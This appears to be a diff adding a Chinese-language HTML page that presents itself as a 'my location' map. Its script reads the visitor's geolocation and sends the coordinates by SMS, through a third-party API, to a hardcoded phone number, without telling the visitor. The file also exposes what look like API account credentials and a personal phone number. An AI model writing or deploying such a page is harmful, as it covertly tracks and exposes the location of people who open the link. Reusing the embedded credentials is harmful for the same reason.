@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title>我的位置</title>
+
+		<style type="text/css">
+		body, html,#allmap {width: 100%;height: 100%;overflow: hidden;margin:0;font-family:"微软雅黑";}
+	</style>
+	</head>
+	<body>
+		<div id="allmap"></div>
+		<!--<p>谢谢你的点击       啦啦啦啦啦啦啦啦啦啦啊啦啦啦</p>-->
+	</body>
+	<script src="css/jquery-3.2.1.js" type="text/javascript" charset="utf-8"></script>
+	<script type="text/javascript" src="https://api.map.baidu.com/api?v=2.0&ak=cUa3tBD8llcSGQmqoQK5AMsnwfaTPNPj"></script>
+	<script src="css/md5.js" type="text/javascript" charset="utf-8"></script>
+	<script type="text/javascript">
+		function getLocation() {
+			if(navigator.geolocation) {
+				navigator.geolocation.getCurrentPosition(showPosition, showError);
+			} else {
+				alert("浏览器不支持地理定位。");
+			}
+		}
+		function showError(error) {
+			switch(error.code) {
+				case error.PERMISSION_DENIED:
+					alert("定位失败,用户拒绝请求地理定位");
+					break;
+				case error.POSITION_UNAVAILABLE:
+					alert("右上角浏览器打开\n暂不支持iphone的safari浏览器 \n 请选择其他浏览器  谢谢！");
+					break;
+				case error.TIMEOUT:
+					alert("定位失败,请求获取用户位置超时");
+					break;
+				case error.UNKNOWN_ERROR:
+					alert("定位失败,定位系统失效");
+					break;
+			}
+		}
+		function showPosition(position) {
+			var lat = position.coords.latitude; //纬度 
+			var lag = position.coords.longitude; //经度 
+			console.log('纬度:' + lat + ',经度:' + lag);
+//			var map = new BMap.Map("container"); // 创建地图实例  
+//			var point = new BMap.Point(lag, lat); // 创建点坐标 经纬度   哈哈哈  
+//			map.centerAndZoom(point, 18); // 初始化地图，设置中心点坐标和地图级别
+    //开始渲染地图
+		    var map = new BMap.Map("allmap");
+			var point = new BMap.Point();
+			
+			map.centerAndZoom(point,18);
+			var geolocation = new BMap.Geolocation();
+			geolocation.getCurrentPosition(function(r){
+				if(this.getStatus() == BMAP_STATUS_SUCCESS){
+					var mk = new BMap.Marker(r.point);
+					map.addOverlay(mk);
+					map.panTo(r.point);
+//					alert('您的位置：'+r.point.lng+','+r.point.lat);
+				}
+				else {
+					alert('failed'+this.getStatus());
+				}        
+			},{enableHighAccuracy: true});
+			map.enableScrollWheelZoom(true);  //启用鼠标滚轮
+						
+//			渲染结束
+			var timestamp = getNowFormatDate(); //  执行时间戳函数
+			//			alert(timestamp);
+			console.log(timestamp);
+			var sign = "7ca4aa4553d54813bf9b30f0f7a7934457bde7371b0b4192ba7274af2161bf3e" + timestamp; //sig 字符串拼接
+			//			alert(sign);
+			var sig = hex_md5(sign); // sig加密    秒滴接口要求  sig必须 md5方式加密
+			//			alert(sig);
+			$.ajax({
+				type: "POST",
+				url: "https://api.miaodiyun.com/20150822/industrySMS/sendSMS",
+				data: {
+					accountSid: "7ca4aa4553d54813bf9b30f0f7a79344",
+					templateid: "62848115",
+					param: lat + "," + lag, //传递的变量
+					to: "18297907332",
+					timestamp: timestamp,
+					sig: sig
+				},
+				dataType: "JSON",
+				beforeSend: function(request) {
+					request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				},
+				success: function(data) {
+					alert(data.respCode + ":" + data.respDesc);
+				},
+				error: function() {
+					//					alert("error");
+					console.log("error");
+				}
+			});
+		}
+		getLocation(); //获取位置信息
+		//获取时间戳
+		function getNowFormatDate() {
+			var date = new Date();
+			var month = date.getMonth() + 1;
+			var hour = date.getHours();
+			var strDate = date.getDate(); //返回那一号
+			var minutes = date.getMinutes();
+			var second = date.getSeconds();
+			function getDate(num) {
+				return(num > 0 && num <= 9) ? num = '0' + num : num;
+			}
+			getDate(month);
+			getDate(hour);
+			getDate(strDate);
+			getDate(minutes);
+			getDate(second);
+			var currentdate = "" + date.getFullYear() + getDate(month) + getDate(strDate) + getDate(hour) + getDate(minutes) + getDate(second);
+			return currentdate;
+		}
+	</script>
+</html>
